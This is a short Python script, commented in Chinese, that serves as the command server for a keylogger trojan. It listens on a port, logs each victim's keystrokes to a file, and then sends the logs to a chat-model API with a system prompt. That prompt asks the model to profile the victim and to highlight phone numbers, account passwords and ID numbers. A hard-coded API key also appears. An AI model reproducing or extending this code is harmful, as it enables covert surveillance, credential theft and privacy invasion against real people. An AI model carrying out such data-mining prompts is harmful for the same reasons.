# 后台 收到受害者每一个操作
import threading
from socket import *
import openai

# 网络后台
S = socket()
S.bind(('0.0.0.0', 9527))
S.listen()
# 接受木马连接
s, addr = S.accept()
print("受害者IP:", addr)
#做什么？
def recv_log():
    while True:
        key = s.recv(1024).decode()
        with open(f'logs-{addr[0]}.txt', 'a') as file: # 追加的方式打开文件
            file.write(key)
# 谁来做？
thread1 = threading.Thread(target=recv_log)
# 开始做！
thread1.start()

while True:
    print('正在记录中....')
    while input('输入“分析”，开始用AI解析数据') != '分析': pass
    with open(f'logs-{addr[0]}.txt', 'r') as file:
        log_text = file.read()
    # 创建智能体
    xiaoLu = openai.OpenAI(base_url='https://api.deepseek.com', api_key='sk-a0e34ba674ac4c73aa2e150a16ce503b')
    # 角色扮演
    system_prompt = '''
        你是一个计算机的高手！
        用户会提交一份电脑键盘操作的日志记录。
        你需要详细分解这个操作记录。
        仔细分析这个人的资料（包括但不限于职业 年龄 性别 爱好 生活和工作状态等等）
        你需要给我一份可以在不做任何修改的情况下直接写入md文件的答案！
        如果能分析出此人的私人信息 电话 账号密码 身份证等，请重点标注！
    '''
    result = xiaoLu.chat.completions.create(
        model = 'deepseek-chat',
        messages=[
            {'role':'system','content': system_prompt},
            {'role':'user','content': log_text}
        ],
    )
    with open(f'logs-{addr[0]}.md', 'w',encoding='utf-8') as f:
        f.write(result.choices[0].message.content)

